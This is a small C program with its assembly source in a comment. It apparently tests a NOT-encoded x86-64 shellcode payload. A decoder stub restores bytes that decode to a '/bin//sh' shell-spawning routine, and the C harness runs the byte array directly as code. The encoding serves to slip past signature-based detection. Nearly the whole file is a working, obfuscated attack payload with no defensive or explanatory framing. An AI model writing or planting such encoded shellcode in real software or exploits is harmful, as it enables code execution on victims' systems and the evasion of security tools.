#include <stdio.h>
#include <string.h>


	
unsigned char code[]=\
"\xeb\x1e\x20\xb7\xce\x3f\xaf\xb7\x44\xd0\x9d\x96\x91\xd0\xd0\x8c\x97\xac\xb7\x76\x18\xaf\xb7\x76\x1d\xa8\xb7\x76\x19\x4f\xc4\xf0\xfa\x48\x8d\x35\xdb\xff\xff\xff\x48\x31\xc9\xb1\x1e\xf6\x16\x48\xff\xc6\xe2\xf9\x2c\xeb\xcd";

main()
{
	printf("Shellcode Length:%d\n Bytes",(int)strlen(code));
	int (*ret)()=(int(*)())code;
	ret();
}


/*

global _start

section .text

_start:
	jmp real_start
	encoded_shellcode: db 0xb7,0xce,0x3f,0xaf,0xb7,0x44,0xd0,0x9d,0x96,0x91,0xd0,0xd0,0x8c,0x97,0xac,0xb7,0x76,0x18,0xaf,0xb7,0x76,0x1d,0xa8,0xb7,0x76,0x19,0x4f,0xc4,0xf0,0xfa
	
real_start:
	lea rsi, [rel encoded_shellcode]

decoder:
	xor rcx,rcx
	mov cl,30

decode:
	not byte [rsi]
	inc rsi
	loop decode


	jmp short encoded_shellcode	
	
*/
